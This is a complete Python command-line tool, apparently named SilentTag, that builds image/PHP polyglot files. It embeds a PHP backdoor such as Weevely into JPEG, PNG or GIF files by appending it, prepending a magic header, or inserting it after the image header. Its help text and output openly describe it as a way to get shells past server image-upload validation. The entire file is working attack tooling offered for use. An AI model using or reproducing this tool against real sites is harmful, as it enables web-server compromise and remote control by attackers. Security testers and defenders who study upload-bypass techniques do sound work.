#!/usr/bin/env python3
"""
SilentTag - PHP Shell Image Injector
Injects PHP backdoors (Weevely or custom) into legitimate image files
Creates polyglot files that pass image validation checks
"""

import sys
import os
import argparse
from pathlib import Path

class ShellInjector:
    
    IMAGE_HEADERS = {
        'jpg': b'\xFF\xD8\xFF\xE0',
        'jpeg': b'\xFF\xD8\xFF\xE0',
        'png': b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A',
        'gif': b'GIF89a',
        'gif87': b'GIF87a',
        'bmp': b'BM',
    }
    
    def __init__(self, image_path, shell_path, output_path=None, method='append'):
        self.image_path = Path(image_path)
        self.shell_path = Path(shell_path)
        self.output_path = Path(output_path) if output_path else None
        self.method = method
        
        if not self.image_path.exists():
            raise FileNotFoundError(f"Image file not found: {image_path}")
        if not self.shell_path.exists():
            raise FileNotFoundError(f"Shell file not found: {shell_path}")
    
    def detect_image_type(self):
        """Detect image type by reading magic bytes"""
        with open(self.image_path, 'rb') as f:
            header = f.read(8)
        
        for img_type, magic in self.IMAGE_HEADERS.items():
            if header.startswith(magic):
                return img_type
        
        # Fallback to extension
        return self.image_path.suffix.lstrip('.').lower()
    
    def inject_append(self):
        """Append PHP shell to end of image (most compatible)"""
        print(f"[*] Method: APPEND")
        print(f"[*] Reading image: {self.image_path}")
        
        with open(self.image_path, 'rb') as img:
            image_data = img.read()
        
        print(f"[*] Reading shell: {self.shell_path}")
        with open(self.shell_path, 'rb') as shell:
            shell_data = shell.read()
        
        # Combine: image + shell
        combined = image_data + b'\n' + shell_data
        
        return combined
    
    def inject_prepend_with_header(self):
        """Prepend valid image header, then PHP, then image data"""
        print(f"[*] Method: HEADER PREPEND")
        
        img_type = self.detect_image_type()
        header = self.IMAGE_HEADERS.get(img_type, b'GIF89a')
        
        print(f"[*] Detected image type: {img_type}")
        print(f"[*] Using header: {header}")
        
        with open(self.image_path, 'rb') as img:
            image_data = img.read()
        
        with open(self.shell_path, 'rb') as shell:
            shell_data = shell.read()
        
        # Combine: header + newline + PHP + image
        combined = header + b'\n' + shell_data + b'\n' + image_data
        
        return combined
    
    def inject_comment_injection(self):
        """Inject PHP into image comment/metadata section (advanced)"""
        print(f"[*] Method: COMMENT INJECTION")
        print(f"[*] Reading files...")
        
        with open(self.image_path, 'rb') as img:
            image_data = img.read()
        
        with open(self.shell_path, 'rb') as shell:
            shell_data = shell.read()
        
        img_type = self.detect_image_type()
        
        if img_type in ['gif', 'gif87']:
            # GIF: Insert after header
            header = image_data[:6]
            rest = image_data[6:]
            combined = header + b'\n' + shell_data + b'\n' + rest
        elif img_type in ['jpg', 'jpeg']:
            # JPEG: Insert after SOI marker
            combined = image_data[:2] + b'\n' + shell_data + b'\n' + image_data[2:]
        else:
            # Fallback to append
            combined = image_data + b'\n' + shell_data
        
        return combined
    
    def generate_output_name(self):
        """Generate output filename if not specified"""
        if self.output_path:
            return self.output_path
        
        img_ext = self.image_path.suffix
        base_name = self.shell_path.stem
        
        # Create name like: backdoor_injected.jpg
        output_name = f"{base_name}_injected{img_ext}"
        return Path(self.image_path.parent) / output_name
    
    def inject(self):
        """Main injection method"""
        print("=" * 60)
        print("PHP Shell Image Injector")
        print("=" * 60)
        print()
        
        # Select injection method
        if self.method == 'append':
            combined_data = self.inject_append()
        elif self.method == 'prepend':
            combined_data = self.inject_prepend_with_header()
        elif self.method == 'comment':
            combined_data = self.inject_comment_injection()
        else:
            print(f"[-] Unknown method: {self.method}")
            return False
        
        # Generate output path
        output_path = self.generate_output_name()
        
        # Write combined file
        print(f"[*] Writing output: {output_path}")
        with open(output_path, 'wb') as out:
            out.write(combined_data)
        
        file_size = os.path.getsize(output_path)
        print(f"[+] Output file size: {file_size} bytes")
        print()
        print("[+] SUCCESS! Polyglot file created!")
        print()
        print(f"[*] Output file: {output_path}")
        print(f"[*] Upload this file to bypass image validation")
        print()
        
        return True

def create_sample_image(output_path, img_type='gif'):
    """Create a minimal valid image file for testing"""
    print(f"[*] Creating sample {img_type.upper()} image...")
    
    if img_type == 'gif':
        # Minimal valid GIF
        data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    elif img_type in ['jpg', 'jpeg']:
        # Minimal valid JPEG
        data = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9=82<.342\xFF\xC0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\xFF\xDA\x00\x08\x01\x01\x00\x00?\x00\x7F\x00\xFF\xD9'
    elif img_type == 'png':
        # Minimal valid PNG
        data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    else:
        data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    
    with open(output_path, 'wb') as f:
        f.write(data)
    
    print(f"[+] Created: {output_path}")
    return output_path

def main():
    parser = argparse.ArgumentParser(
        description='Inject PHP shells into image files for upload bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic injection (append method)
  %(prog)s image.jpg backdoor.php
  
  # Specify output file
  %(prog)s image.jpg backdoor.php -o malicious.jpg
  
  # Use prepend method
  %(prog)s image.png shell.php -m prepend
  
  # Create sample image for testing
  %(prog)s --create-sample sample.gif
  
Methods:
  append  - Append shell to end of image (most compatible)
  prepend - Add image header, then shell, then image
  comment - Inject into image metadata (advanced)
        """
    )
    
    parser.add_argument('image', nargs='?', help='Path to legitimate image file')
    parser.add_argument('shell', nargs='?', help='Path to PHP shell file')
    parser.add_argument('-o', '--output', help='Output file path')
    parser.add_argument('-m', '--method', 
                       choices=['append', 'prepend', 'comment'],
                       default='append',
                       help='Injection method (default: append)')
    parser.add_argument('--create-sample', metavar='FILE',
                       help='Create a sample image file for testing')
    
    args = parser.parse_args()
    
    # Handle sample creation
    if args.create_sample:
        ext = Path(args.create_sample).suffix.lstrip('.').lower() or 'gif'
        create_sample_image(args.create_sample, ext)
        return
    
    # Validate arguments
    if not args.image or not args.shell:
        parser.print_help()
        print("\n[-] Error: Both image and shell files are required")
        sys.exit(1)
    
    try:
        injector = ShellInjector(args.image, args.shell, args.output, args.method)
        injector.inject()
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
